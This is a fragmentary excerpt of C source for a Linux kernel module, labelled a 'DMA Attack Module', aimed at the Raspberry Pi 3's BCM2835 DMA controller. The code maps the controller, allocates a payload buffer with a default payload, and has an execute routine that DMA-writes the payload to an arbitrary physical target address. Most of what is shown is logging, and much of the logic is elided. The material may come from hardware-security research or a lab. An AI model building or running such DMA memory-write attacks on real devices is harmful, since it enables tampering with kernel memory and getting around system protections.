...
/* DMA Control Block - aligned to 256 bytes as required by BCM2835 */
struct dma_cb {
...
{
    phys_addr_t dma_phys = BCM2835_PERI_BASE + DMA_BASE_OFFSET;
    
    pr_info("[DMA_ATTACK] ========================================\n");
    pr_info("[DMA_ATTACK] DMA Attack Module Initialization\n");
    pr_info("[DMA_ATTACK] ========================================\n");
    pr_info("[DMA_ATTACK] Platform: Raspberry Pi 3 (BCM2835)\n");
    pr_info("[DMA_ATTACK] Peripheral Base: 0x%llx\n", (unsigned long long)BCM2835_PERI_BASE);
    pr_info("[DMA_ATTACK] DMA Controller: 0x%llx\n", (unsigned long long)dma_phys);
    pr_info("[DMA_ATTACK] DMA Channel: %d\n", DMA_CHANNEL);
    pr_info("[DMA_ATTACK] Mapping DMA controller...\n");
    
    attack_state.dma_base = ioremap(dma_phys, 0x1000);
    if (!attack_state.dma_base) {
        pr_err("[DMA_ATTACK] ERROR: Failed to map DMA controller at 0x%llx\n", 
                (unsigned long long)dma_phys);
        return -ENOMEM;
    }
    
    pr_info("[DMA_ATTACK] DMA controller mapped successfully (virt: %p)\n", 
            attack_state.dma_base);
    
    /* Reset DMA channel */
    pr_info("[DMA_ATTACK] Resetting DMA channel %d...\n", DMA_CHANNEL);
    iowrite32(1 << 31, attack_state.dma_base + (DMA_CHANNEL * 0x100));
    udelay(100);
    
    pr_info("[DMA_ATTACK] DMA controller initialized successfully\n");
    return 0;
}
...
{
    pr_info("[DMA_ATTACK] Allocating DMA-coherent memory...\n");
    ...
    if (!attack_state.control_block) {
        pr_err("[DMA_ATTACK] ERROR: Failed to allocate control block\n");
        return -ENOMEM;
    }
    pr_info("[DMA_ATTACK] Control Block allocated: phys=0x%llx, virt=%p\n",
    ...
    if (!attack_state.payload_buffer) {
        pr_err("[DMA_ATTACK] ERROR: Failed to allocate payload buffer\n");
        dma_free_coherent(dev, sizeof(struct dma_cb),
                         attack_state.control_block,
                         attack_state.cb_dma_handle);
        return -ENOMEM;
    }
    pr_info("[DMA_ATTACK] Payload buffer allocated: phys=0x%llx, virt=%p, size=%zu\n",
    ...
    pr_info("[DMA_ATTACK] Default payload loaded (%zu bytes)\n", sizeof(default_payload));
    
    pr_info("[DMA_ATTACK] Buffer allocation complete\n");
    return 0;
}
...
static int dma_attack_execute(u32 target_addr, size_t length)
{
    ...
    if (length > attack_state.payload_size) {
        pr_err("[DMA_ATTACK] ERROR: Payload too large (%zu > %zu)\n",
               length, attack_state.payload_size);
        return -EINVAL;
    }
    
    pr_info("[DMA_ATTACK] ========================================\n");
    pr_info("[DMA_ATTACK] DMA Transfer Initiated\n");
    pr_info("[DMA_ATTACK] Target Address: 0x%08x\n", target_addr);
    pr_info("[DMA_ATTACK] Transfer Length: %zu bytes\n", length);
    pr_info("[DMA_ATTACK] Source (Payload): 0x%llx\n",
            (unsigned long long)attack_state.payload_dma_handle);
    ...
    pr_info("[DMA_ATTACK] Control Block configured\n");
    ...
    /* Start transfer */
    pr_info("[DMA_ATTACK] Starting DMA transfer on channel %d...\n", DMA_CHANNEL);
    ...
    while (timeout-- > 0) {
        ...
        if (cs & (1 << 1)) {  /* END flag */
            ...
            pr_info("[DMA_ATTACK] Bytes transferred: %zu\n", length);
            pr_info("[DMA_ATTACK] ========================================\n");
            /* Clear END flag */
        ...
        if (cs & (1 << 2)) {  /* ERROR flag */
            ...
            pr_err("[DMA_ATTACK] Transfer FAILED\n");
            pr_err("[DMA_ATTACK] ========================================\n");
            return -EIO;
        }
    ...
    pr_err("[DMA_ATTACK] ✗ DMA transfer TIMEOUT (exceeded 10ms)\n");
    pr_err("[DMA_ATTACK] ========================================\n");
    return -ETIMEDOUT;
}
...
static int __init dma_attack_init(void)
{
    ...
    /* Setup DMA mask pointers for dummy device */
    attack_state.dev->dma_mask = &attack_state.dev->coherent_dma_mask;
    attack_state.dev->coherent_dma_mask = DMA_BIT_MASK(32);
